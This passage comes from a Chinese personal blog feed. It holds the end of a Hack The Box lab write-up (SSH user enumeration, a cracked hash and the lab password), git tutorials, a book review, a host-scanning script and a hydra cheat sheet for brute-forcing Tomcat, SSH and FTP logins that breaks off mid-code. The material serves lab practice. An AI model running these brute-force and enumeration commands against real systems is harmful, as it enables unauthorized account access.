/root/Desktop/10.10.10.86/pass.lst<br></code></pre></div></td></tr></table></figure><h4 id="再次ssh扫描可用用户"><a href="#再次ssh扫描可用用户" class="headerlink" title="再次ssh扫描可用用户"></a>再次ssh扫描可用用户</h4><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">msfconsole<br>use scanner<span class="hljs-regexp">/ssh/</span>ssh_enumusers<br>set RHOSTS <span class="hljs-number">10.10</span>.<span class="hljs-number">10.86</span><br>set USER_FILE <span class="hljs-regexp">/root/</span>Desktop<span class="hljs-regexp">/10.10.10.86/u</span>ser.lst<br></code></pre></div></td></tr></table></figure><p>genevieve 是有效用户名</p><p><code>jq . test.json | grep genevieve</code>获得了加密的hash<code>fc7992e8952a8ff5000cb7856d8586d2</code></p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/04-19-04/12.PNG" alt="12"><br>在线解密结果：Princess1</p><p>ssh <a href="mailto:&#103;&#x65;&#110;&#101;&#x76;&#x69;&#101;&#x76;&#x65;&#64;&#x31;&#x30;&#x2e;&#x31;&#x30;&#x2e;&#x31;&#x30;&#46;&#56;&#54;">&#103;&#x65;&#110;&#101;&#x76;&#x69;&#101;&#x76;&#x65;&#64;&#x31;&#x30;&#x2e;&#x31;&#x30;&#x2e;&#x31;&#x30;&#46;&#56;&#54;</a></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>值得反思的是，关于弱密码，应该在vps上部署脚本，然后自动化探测。</p><p>这个靶机做不出来，很正常的。。。没见过的服务，入侵思路都找不到。</p><h4 id="如何检查一张图片中是否有隐藏的信息"><a href="#如何检查一张图片中是否有隐藏的信息" class="headerlink" title="如何检查一张图片中是否有隐藏的信息"></a>如何检查一张图片中是否有隐藏的信息</h4><figure class="highlight mipsasm"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mipsasm">exiftool xx.<span class="hljs-keyword">jpg</span><br><span class="hljs-keyword"></span>strings xx.<span class="hljs-keyword">jpg|less</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">binwalk </span>xx.<span class="hljs-keyword">jpg</span><br><span class="hljs-keyword"></span>xxd xx.<span class="hljs-keyword">jpg </span><span class="hljs-title">|less</span><br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>training</category>
      
    </categories>
    
    
    <tags>
      
      <tag>training</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>git（一） 命令行操作</title>
    <link href="/2019/04/12/02-x/"/>
    <url>/2019/04/12/02-x/</url>
    
    <content type="html"><![CDATA[<p>参考：<a href="http://www.ruanyifeng.com/blog/2014/06/git_remote.html">Git远程操作详解</a></p><p>git = GNU it 是一个版本控制系统。</p><p>github和简书有点像，这里放的是文章，github放的是代码。</p><p>github的精髓就是<strong>开源</strong>，开放源代码使得所有人可以方便的学习编程，可以使得开放的软件被众人浏览从而发现bug，而不是像闭源软件那样藏得严严实实生怕别人偷走了劳动成功。</p><p>开源闭源各有优缺点这里就不开展撕逼大战了。</p><p>github账号注册就不写了，这里聊聊github的使用。</p><blockquote><p>前提：需要有一个github账号，并且新建一个仓库。</p></blockquote><h2 id="案例：用git进行版本控制。"><a href="#案例：用git进行版本控制。" class="headerlink" title="案例：用git进行版本控制。"></a>案例：用git进行版本控制。</h2><blockquote><p>简单的说就是本地建立一个目录，然后通过一些命令批量备份到云端<br>（远程）。</p></blockquote><h3 id="步骤一："><a href="#步骤一：" class="headerlink" title="步骤一："></a>步骤一：</h3><p>在github上新建一个仓库，使用<code>git clone 仓库地址</code>下载到本地</p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">git clone https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/Whale3070/</span>test<br></code></pre></div></td></tr></table></figure><p>git config -l</p><p>查看配置信息</p><h3 id="步骤二："><a href="#步骤二：" class="headerlink" title="步骤二："></a>步骤二：</h3><p>git设置一下该仓库的用户的信息，并初始化</p><figure class="highlight stylus"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs stylus"><span class="hljs-selector-id">#git</span> config ‐‐global user<span class="hljs-selector-class">.name</span> <span class="hljs-string">&quot;whale&quot;</span><br><span class="hljs-selector-id">#git</span> config ‐‐global user<span class="hljs-selector-class">.email</span> xx@qq<span class="hljs-selector-class">.com</span><br><span class="hljs-selector-id">#git</span> config --global credential<span class="hljs-selector-class">.helper</span> store <br>配置存储密码<br><span class="hljs-selector-id">#git</span> config --list<br><span class="hljs-selector-id">#git</span> init<br></code></pre></div></td></tr></table></figure><h3 id="步骤三"><a href="#步骤三" class="headerlink" title="步骤三"></a>步骤三</h3><p>添加远程git目录，将远程的和本地的目录进行关联。<br>关联不需要验证，但是推送到远程目录时，需要验证。</p><p>3.1<br>将本地和远程关联的格式：</p><p>是用git remote add 主机名 网址来添加的。</p><p>a是远程的地址，b是本地的地址。</p><p><code>#git remote add origin https://github.com/Whale3070/test</code></p><p>3.2 发送到远程目录<br>新建一个文件，test.c。</p><figure class="highlight stylus"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs stylus"><span class="hljs-selector-id">#touch</span> test<span class="hljs-selector-class">.c</span><br><span class="hljs-selector-id">#echo</span> <span class="hljs-string">&#x27;hello world&#x27;</span> &gt; test<span class="hljs-selector-class">.c</span><br><span class="hljs-selector-id">#git</span> add test<span class="hljs-selector-class">.c</span><br>修改完，需要手动添加，之后发送的是这个时间点的test.c。<br><span class="hljs-selector-id">#git</span> commit ‐m <span class="hljs-string">&quot;文件说明&quot;</span><br><span class="hljs-selector-id">#git</span> push ‐u origin master<br></code></pre></div></td></tr></table></figure><p>于是本地的更改会发送到<code>https://github.com/Whale3070/ctfcoding</code>这个地址下。</p><h3 id="错误："><a href="#错误：" class="headerlink" title="错误："></a>错误：</h3><p>提交了空目录</p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/04-12-02/11.PNG" alt="11"></p><p>解决方式：<a href="https://blog.csdn.net/s164828378/article/details/52425208">Git常见错误与操作</a></p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/04-12-02/12.PNG" alt="12"></p><p>错误二：fatal: refusing to merge unrelated histories</p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/04-12-02/13.PNG" alt="13"></p><p>当 远程 ‐‐‐&gt;本地 时候，报错</p><p>运行<code>git pull origin master ‐‐allow‐unrelated‐histories</code><br>因为git版本原因。</p><p>错误三：</p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/04-12-02/14.PNG" alt="14"></p><p>git push origin master ==》命令x</p><blockquote><p>本来是本地status A ‐‐‐&gt; 远程status A<br>然后，我们更改本地status A ，为本地status A1<br>将本地status A1 发送到远程。</p></blockquote><blockquote><p>但是<br>本地status A ‐‐‐&gt; 远程status B ，因为远程被更改<br>于是它们状态不同，要先同步一下，才能将本地发送出去。<br>远程status B ‐‐‐‐&gt; 本地status B 同步完成<br>再运行命令x 即可。</p></blockquote><h2 id="1-git-config-‐‐list-查看已经设置的参数"><a href="#1-git-config-‐‐list-查看已经设置的参数" class="headerlink" title="1. git config ‐‐list 查看已经设置的参数"></a>1. git config ‐‐list 查看已经设置的参数</h2><p>git config 查看可用的选项</p><p>一般要设置用户名，邮箱，远程origin地址等</p><h2 id="2-远程推送无需用户名密码，使用密钥认证。"><a href="#2-远程推送无需用户名密码，使用密钥认证。" class="headerlink" title="2. 远程推送无需用户名密码，使用密钥认证。"></a>2. 远程推送无需用户名密码，使用密钥认证。</h2><p>ssh ‐T <a href="mailto:&#x67;&#105;&#116;&#x40;&#x67;&#x69;&#x74;&#104;&#117;&#98;&#x2e;&#99;&#x6f;&#109;">&#x67;&#105;&#116;&#x40;&#x67;&#x69;&#x74;&#104;&#117;&#98;&#x2e;&#99;&#x6f;&#109;</a></p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/04-12-02/7.PNG" alt="7"></p><p>错误：</p><figure class="highlight angelscript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs angelscript">sign_and_send_pubkey: signing failed: agent <span class="hljs-built_in">ref</span>used operation<br>Permission denied (publickey).<br></code></pre></div></td></tr></table></figure><p>解决：</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-built_in">eval</span> <span class="hljs-string">&quot;<span class="hljs-subst">$(ssh‐agent ‐s)</span>&quot;</span><br>ssh‐add<br></code></pre></div></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/04-12-02/8.PNG" alt="8"></p>]]></content>
    
    
    <categories>
      
      <category>tools</category>
      
    </categories>
    
    
    <tags>
      
      <tag>tools</tag>
      
      <tag>git</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>git（二）git与blog</title>
    <link href="/2019/04/12/03-x/"/>
    <url>/2019/04/12/03-x/</url>
    
    <content type="html"><![CDATA[<h2 id="git与blog"><a href="#git与blog" class="headerlink" title="git与blog"></a>git与blog</h2><p>在上一小节的基础上（git本地新建目录，初始化，git基本操作），学习下git搭建静态blog。<br>jekyll是一个生成静态网页的工具，不需要数据库支持</p><h3 id="步骤一："><a href="#步骤一：" class="headerlink" title="步骤一："></a>步骤一：</h3><p>github 建立一个仓库，<code>格式用户名.github.io</code></p><h3 id="步骤二："><a href="#步骤二：" class="headerlink" title="步骤二："></a>步骤二：</h3><p>git remote ‐v<br>如果显示的远程目录不是<code>whale3070.github.io</code>这种github.io类型的。</p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">git remote rm origin<br>git remote add origin https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/Whale3070/</span>whale3070.github.io<br></code></pre></div></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/04-12-03/10.PNG" alt="10"><br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/04-12-03/9.PNG" alt="9"></p><p>克隆远程目录到本地。</p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">cd <span class="hljs-regexp">/home/</span>backups/backup.git<br>git clone https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/Whale3070/</span>whale3070.github.io<br></code></pre></div></td></tr></table></figure><h3 id="步骤三："><a href="#步骤三：" class="headerlink" title="步骤三："></a>步骤三：</h3><p>将远程目录同步到本地。 确保它们的状态是一致的。<br>如果两个目录内容不同，那么对本地的修改同步到远程的时候，会出错。<br>git pull origin master</p><h3 id="步骤四："><a href="#步骤四：" class="headerlink" title="步骤四："></a>步骤四：</h3><p>准备将本地的修改，同步到远程。<br>选择一个博客模板，克隆到本地。</p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">git clone https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/poole/</span>poole<br>ls <br></code></pre></div></td></tr></table></figure><p>目录下多了一个poole文件夹</p><h3 id="步骤五："><a href="#步骤五：" class="headerlink" title="步骤五："></a>步骤五：</h3><p>git add poole/*</p><p>将需要添加到远程目录的文件，用add命令选择下</p><p>git commit ‐m “test”</p><p>添加注释</p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/04-12-03/9.PNG" alt="9"></p><p>git push ‐u origin master</p><p>将选中的文件发送到github。输入github的用户名和密码即可。</p><h3 id="步骤六："><a href="#步骤六：" class="headerlink" title="步骤六："></a>步骤六：</h3><p>blog搭建好了一个框架，下一节讲一下blog的文章如何post。</p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/04-12-03/10.PNG" alt="10"></p><p><a href="https://github.com/Whale3070/Whale3070.github.io/blob/master/_posts/git%EF%BC%88%E4%B8%89%EF%BC%89blog%E4%B8%BB%E9%A2%98.pdf">git（三）blog主题</a></p>]]></content>
    
    
    <categories>
      
      <category>tools</category>
      
    </categories>
    
    
    <tags>
      
      <tag>tools</tag>
      
      <tag>git</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>git（五）自动更新blog</title>
    <link href="/2019/04/12/04-x/"/>
    <url>/2019/04/12/04-x/</url>
    
    <content type="html"><![CDATA[<p>这里的自动更新，并不是说人工智能时代可以不用写blog，都交给机器来写：）</p><p>当把markdown格式文件放在/root/Desktop目录下，再运行该脚本。</p><p><strong>可以给图片添加水平，并且上传到搭建好的blog。</strong></p><figure class="highlight jboss-cli"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs jboss-cli">vi <span class="hljs-string">/root/.bashrc</span><br><span class="hljs-keyword">alias</span> update=&#x27;<span class="hljs-keyword">cd</span> <span class="hljs-string">/home/Whale3070.github.io</span>;git add .;git commit -m <span class="hljs-string">&quot;update&quot;</span>;git push;<span class="hljs-keyword">cd</span> /&#x27;<br></code></pre></div></td></tr></table></figure><p>重启linux，输入update命令，即可更新本地blog到远程。</p><h2 id="updateBlog-sh"><a href="#updateBlog-sh" class="headerlink" title="updateBlog.sh"></a>updateBlog.sh</h2><p>输入<strong>文章标题</strong>，该输入内容会显示在更新的blog中。<br>输入该文章的类型。</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br><span class="hljs-comment">#update blog</span><br><span class="hljs-built_in">read</span> -p <span class="hljs-string">&quot;markdown name : &quot;</span> mdname<br><span class="hljs-built_in">read</span> -p <span class="hljs-string">&quot;markdown acticle type? &quot;</span> itype<br>pic=`date +%m-%d-%I`<br>time=`date +%Y-%m-%d-%I`<br><br>mv /root/Desktop/*.md /root/Desktop/<span class="hljs-variable">$&#123;time&#125;</span>-x.md<br>mv /root/Desktop/*.md /home/Whale3070.github.io/_posts<br>mkdir /home/Whale3070.github.io/img/<span class="hljs-variable">$&#123;pic&#125;</span><br>cp /root/Desktop/*.resource/* /home/Whale3070.github.io/img/<span class="hljs-variable">$&#123;pic&#125;</span> &amp;&amp; rm -rf /root/Desktop/*resource<br><br><span class="hljs-built_in">cd</span> /home/Whale3070.github.io/_posts<br>sed -i <span class="hljs-string">&#x27;s/\https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/04-12-04/https:\/\/raw.githubusercontent.com\/Whale3070\/Whale3070.github.io\/master\/img\/&#x27;</span><span class="hljs-variable">$&#123;pic&#125;</span><span class="hljs-string">&#x27;/g&#x27;</span> <span class="hljs-variable">$&#123;time&#125;</span>-x.md<br>python /root/tool/mark.py /home/Whale3070.github.io/img/<span class="hljs-variable">$&#123;pic&#125;</span><br><br>sed -i <span class="hljs-string">&#x27;1 i---&#x27;</span> <span class="hljs-variable">$&#123;time&#125;</span>-x.md<br>sed -i <span class="hljs-string">&quot;2 ititle: <span class="hljs-variable">$&#123;mdname&#125;</span>&quot;</span> <span class="hljs-variable">$&#123;time&#125;</span>-x.md<br>sed -i <span class="hljs-string">&#x27;3 icategories:&#x27;</span> <span class="hljs-variable">$&#123;time&#125;</span>-x.md<br>sed -i <span class="hljs-string">&quot;4 i- <span class="hljs-variable">$itype</span>&quot;</span> <span class="hljs-variable">$&#123;time&#125;</span>-x.md<br>sed -i <span class="hljs-string">&#x27;5 itags:&#x27;</span> <span class="hljs-variable">$&#123;time&#125;</span>-x.md<br>sed -i <span class="hljs-string">&quot;6 i- <span class="hljs-variable">$itype</span>&quot;</span> <span class="hljs-variable">$&#123;time&#125;</span>-x.md<br>sed -i <span class="hljs-string">&quot;7 i---&quot;</span> <span class="hljs-variable">$&#123;time&#125;</span>-x.md<br></code></pre></div></td></tr></table></figure><h2 id="mark-py"><a href="#mark-py" class="headerlink" title="mark.py"></a>mark.py</h2><p>/root/tool/i.png，是水印图片</p><figure class="highlight elm"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs elm"><span class="hljs-keyword">import</span> png<br><span class="hljs-keyword">import</span> Image<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> os<br><br><span class="hljs-title">wpath</span> = sys.argv[<span class="hljs-number">1</span>]<br><br><span class="hljs-title">filelist</span> = os.listdir(wpath)<br><span class="hljs-title">for</span> filename <span class="hljs-keyword">in</span> filelist:<br>        png_path = wpath+<span class="hljs-string">&quot;/&quot;</span>+filename<br>        mark = <span class="hljs-type">Image</span>.open(<span class="hljs-string">&quot;/root/tool/i.png&quot;</span>)<br>        png.water(png_path,mark)<br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>tools</category>
      
    </categories>
    
    
    <tags>
      
      <tag>tools</tag>
      
      <tag>git</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>围城--读后感</title>
    <link href="/2019/04/03/12-x/"/>
    <url>/2019/04/03/12-x/</url>
    
    <content type="html"><![CDATA[<p>围城</p><p>一开始读这本书，实在是硬着头皮读下去，像吃一个不甜的梨子，咬了几口，食之无味弃之可惜。</p><p>之前读了杨绛的《我们仨》，鼻子酸酸的，感触良多。</p><p>因为“结婚就像围城，外面的人想进去，里面的人想出来”，这个名句流传甚广，</p><p>所以读不进去必定是我的问题。作为一本名著，必定有它的魅力之处。</p><p>再选了一个无人打扰的地点、无事牵绊的时间，于是再重读。</p><hr><p>… 适应了快餐网络文学，读这种书的确需要耐心。但是读完的确有一些思考，不是没有营养价值的快餐文字可以比拟的。</p><p>百度百科上说，围城…故事主要写抗战初期知识分子的群相…</p><p>还没读之前，我对于本书有误解，以为是既然是抗战时期，肯定是描写<strong>抗战</strong>的。好比上海滩，琼瑶的情深深雨蒙蒙，当战火的硝烟燃起，有志青年肯定要奔赴抗日。</p><p>从现代人的角度，我可以给这本书起很多名字。</p><p>《落魄少爷的红玫瑰与白玫瑰》<br>《论旧时代文科博士的婚姻状况研究》<br>《如何把一手好牌打输》<br>…</p><p>对于方鸿渐，我是没有任何共鸣的。</p><p>作为前清举人之子，高中时和地方有钱人订婚，因未婚妻过世。</p><p>方写信慰问伯父伯母，于是就好运的拿未婚妻的嫁妆出国留学。</p><p>有人资助他出国留学，他竟然荒废了几年，懒散度过。</p><p>在回国的船上，别的女人勾引他，他也随随便便。</p><p>在我看来，这是一个没有理想，没有操守，也谈不上什么文人气节的“伪君子”。</p><p>在那个年代，父母之命媒妁之言，方被订婚，虽然羡慕同学中自由恋爱的美妙，嫌弃未婚妻没有文化，但也没有反抗。</p><p>方的妻子去世，他也只是暗暗高兴，觉得自己自由了。</p><p>方的同学苏小姐，因为读博错过了一些感情，觉得方还不错，方虽然不喜欢苏，但是也半推半就的。</p><p>这时候，他认识了苏的表妹，唐。</p><p>唐是所有男人心中的白莲花。</p><p>年轻、漂亮、可爱。</p><p>但是唐对于爱情的想象太美好了，容忍不了感情经历丰富的方鸿渐。</p><p>后来，也许就跟那句话说的一样，年纪到了，就随便娶了一个不爱的女人。</p><p>争执、吵架，和书名一样，是一个婚姻的围城。</p><hr><p>本书值得仔细回味，书中不少句子都充满文学味道，对提升写作水平大有裨益。</p><p>尤其是杨绛最后写的本书的注释，看的是忍俊不禁。</p><p>羡慕钱钟书和杨绛的婚姻。</p>]]></content>
    
    
    <categories>
      
      <category>View</category>
      
    </categories>
    
    
    <tags>
      
      <tag>View</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>shell-script（三）批量查询域名</title>
    <link href="/2019/04/02/11-x/"/>
    <url>/2019/04/02/11-x/</url>
    
    <content type="html"><![CDATA[<h2 id="知识点一：while–do–done-语句的运用"><a href="#知识点一：while–do–done-语句的运用" class="headerlink" title="知识点一：while–do–done 语句的运用"></a>知识点一：while–do–done 语句的运用</h2><p>案例一：<br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/04-02-11/%E6%8D%95%E8%8E%B7%203.PNG"></p><h2 id="知识点二：判断符号"><a href="#知识点二：判断符号" class="headerlink" title="知识点二：判断符号"></a>知识点二：判断符号</h2><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">-eq           <span class="hljs-regexp">//</span>等于 equal<br><br>-ne           <span class="hljs-regexp">//</span>不等于 not equal<br><br>-gt            <span class="hljs-regexp">//</span>大于 （greater ）<br><br>-lt            <span class="hljs-regexp">//</span>小于  （less）<br><br>-ge            <span class="hljs-regexp">//</span>大于等于 <br><br>-le            <span class="hljs-regexp">//</span>小于等于<br></code></pre></div></td></tr></table></figure><h2 id="知识点三：数字的自增"><a href="#知识点三：数字的自增" class="headerlink" title="知识点三：数字的自增"></a>知识点三：数字的自增</h2><p>var = $(($var + 1))</p><h2 id="案例二："><a href="#案例二：" class="headerlink" title="案例二："></a>案例二：</h2><p>扫描htb所有开放443端口的主机，查询到域名后，自动写入/etc/hosts</p><p>IP-out.txt is the list of IPs</p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk"><span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> $(cat IP-out.txt)<br><span class="hljs-keyword">do</span><br>    nmap -p443 --open <span class="hljs-variable">$&#123;line&#125;</span> &gt;&gt; https<br>    <span class="hljs-comment">#masscan -p443 -e tun0 $line --open #masscan扫描效果不佳</span><br>done<br><span class="hljs-comment">## scan open port ##</span><br><br>cat https | grep <span class="hljs-number">10.10</span>.<span class="hljs-number">10</span> &gt; https_out<br>rm https<br>awk <span class="hljs-string">&#x27;&#123; print $5&#125;&#x27;</span> https_out &gt; https<br>rm https_out<br>cat https | grep <span class="hljs-number">10.10</span>.<span class="hljs-number">10</span> &gt; https_out <span class="hljs-comment">#https_out file is important, it&#x27;s contains all ips who opens 443 port</span><br><span class="hljs-comment">## clearing data ##</span><br><br><span class="hljs-keyword">for</span> IPs <span class="hljs-keyword">in</span> $(cat https_out)<br><span class="hljs-keyword">do</span><br>    sslyze --regular <span class="hljs-variable">$&#123;IPs&#125;</span> --xml_out=<span class="hljs-variable">$&#123;IPs&#125;</span><br>done<br><span class="hljs-comment">## get domain ##</span><br><br><span class="hljs-keyword">for</span> IPs <span class="hljs-keyword">in</span> $(cat https)<br><span class="hljs-keyword">do</span><br>    <span class="hljs-keyword">if</span> ls <span class="hljs-regexp">/root/</span>Desktop<span class="hljs-regexp">/$IPs/</span><span class="hljs-variable">$IPs</span>;then<br>         echo <span class="hljs-string">&#x27;-------------&#x27;</span><br>         mv <span class="hljs-variable">$IPs</span> <span class="hljs-regexp">/root/</span>Desktop/<span class="hljs-variable">$IPs</span><br>         cat <span class="hljs-regexp">/root/</span>Desktop<span class="hljs-regexp">/$IPs/</span><span class="hljs-variable">$IPs</span> | grep <span class="hljs-string">&quot;Common Name&quot;</span> &gt; <span class="hljs-regexp">/root/</span>Desktop<span class="hljs-regexp">/$IPs/</span>domain<br>         Domain=`awk <span class="hljs-string">&#x27;&#123;print $3&#125;&#x27;</span> <span class="hljs-regexp">/root/</span>Desktop<span class="hljs-regexp">/$IPs/</span>domain`<br>         echo <span class="hljs-variable">$IPs</span> <span class="hljs-variable">$Domain</span> &gt;&gt; <span class="hljs-regexp">/etc/</span>hosts<br>    <span class="hljs-keyword">else</span><br>         echo <span class="hljs-string">&#x27;not found&#x27;</span><br>    fi<br>done<br><br>cat <span class="hljs-regexp">/etc/</span>hosts<br></code></pre></div></td></tr></table></figure><p>/etc/hosts成功写入<br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/04-02-11/1.PNG" alt="1"></p><p>但是运行展示效果不佳，以后学习如何写一个看起来整洁、美观、专业的shell script脚本。<br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/04-02-11/2.PNG" alt="2"></p>]]></content>
    
    
    <categories>
      
      <category>linux</category>
      
    </categories>
    
    
    <tags>
      
      <tag>linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>hydra&amp;wfuzz弱密码测试用例(updating)</title>
    <link href="/2019/03/24/02-x/"/>
    <url>/2019/03/24/02-x/</url>
    
    <content type="html"><![CDATA[<h2 id="Apache认证"><a href="#Apache认证" class="headerlink" title="Apache认证"></a>Apache认证</h2><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">cd <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/seclists/</span><br><br>hydra -C Passwords<span class="hljs-regexp">/Default-Credentials/</span>tomcat-betterdefaultpasslist.txt http-get:<span class="hljs-regexp">//i</span>p:port<span class="hljs-regexp">/manager/</span>html<br></code></pre></div></td></tr></table></figure><h2 id="ssh-ftp密码认证"><a href="#ssh-ftp密码认证" class="headerlink" title="ssh/ftp密码认证"></a>ssh/ftp密码认证</h2><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">-l -L 设置用户名<br>-p -P 设置密码<br>小写为单个单词，大写为单词字典。<br>-t （默认<span class="hljs-number">16</span>）设置线程数，防止太大被拦截<br><br>hydra -l user -P <span class="hljs-regexp">/root/</span>Desktop/pass.txt **ip** ssh -t <span class="hljs-number">4</span><br><br>hydra -L <span class="hljs-regexp">/root/</span>Desktop<span class="hljs-regexp">/86/u</span>ser.txt -P <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/wordlists/</span><span class="hljs-number">500</span>-worst-passwords.txt **ip** ftp<br></code></pre></div></td></tr></table></figure><h2 id="web-post表单认证"><a href="#web-post表单认证" class="headerlink" title="web-post表单认证"></a>web-post表单认证</h2><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code 